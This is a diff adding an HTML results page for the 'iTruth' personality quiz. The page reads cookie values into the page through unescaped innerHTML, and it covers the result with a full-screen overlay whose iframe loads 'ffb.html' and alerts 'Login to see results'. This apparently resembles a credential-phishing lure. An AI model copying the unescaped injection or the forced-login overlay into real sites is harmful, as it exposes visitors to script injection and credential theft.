@@ -1,0 +1,70 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
+<script src="https://cdn.jsdelivr.net/npm/js-cookie@2.2.0/src/js.cookie.min.js"></script>
+<script>
+    var Ttype = Cookies.get("Ttype");
+    var Tscore = Cookies.get("Tscore");
+	var Tpath = Cookies.get("Tpath");
+</script>
+<title>Analysis::Result - iTruth</title>
+</head>
+
+<body>
+<div style="width: 100%; height: 100%; background-color: black; z-index: 100; position: fixed;opacity: 1.0;" id="block"></div>
+<div id="gg" class="w3-round-large w3-center" style="z-index: 500; position: fixed; width: 80%; height: 80%; display: inline-block;left: 50%; margin-left: -40%; top: 10%">
+	<iframe id="gjg" scrolling="no" onLoad="document.getElementById('block').style.opacity = 0.8;alert('Login to see results');" width="100%" height="100%" src="ffb.html"></iframe>
+</div>
+<div class="w3-container w3-center">
+  <h1 style="font-size: 50px;">Analysis::Result</h1>
+  <div id="resultTable">
+    <h2 id="type"></h2>
+    <p id="path"></p>
+    <p id="score"></p>
+    <p id="judgement"></p>
+  </div>
+  <a href="javascript: location.href='index.html'">go back</a></div>
+<script>
+    function count(str) {
+    var i = 0;
+    while(str.charAt(i)!="") {
+        ++i;
+    }
+    return i;
+    }
+    function urldata(key) {
+    var u = location.href;
+    var n = count(key);
+    var i = u.search(key)+n+1;
+    var a = "";
+    while(u.charAt(i)!=""&&u.charAt(i)!="&") {
+        a += u.charAt(i);
+        ++i;
+    }
+    return a;
+    }
+		var score = parseInt(Tscore);
+		var Judgement;
+		if(score <=6) {
+			Judgement = "You are a peaceful person, just sometimes you can't help youself to do some unusual things.";
+		} else if(score > 6 && score <= 12) {
+			Judgement = "The surface of your interpersonal relationship may be brightly, but inside yourself you think you are not the person everybody likes.";
+		} else {
+			Judgement = "Your friends are all treat you kindly. You are a lucky person!";
+		}
+		document.getElementById("type").innerHTML = "Test Type: " + Ttype;
+		document.getElementById("path").innerHTML = "Answer Path: " + Tpath;
+		document.getElementById("score").innerHTML = "Test Score: " + Tscore + " (This score only use for judge)";
+		document.getElementById("judgement").innerHTML = "Test Judgement: " + Judgement;
+	function ggy() {
+		document.getElementById("gjg").hidden = true;
+		document.getElementById("gg").hidden = true;
+		document.getElementById("gg").style.zIndex = -1;
+		document.getElementById("block").hidden = true;
+	}
+	</script>
+</body>
+</html>
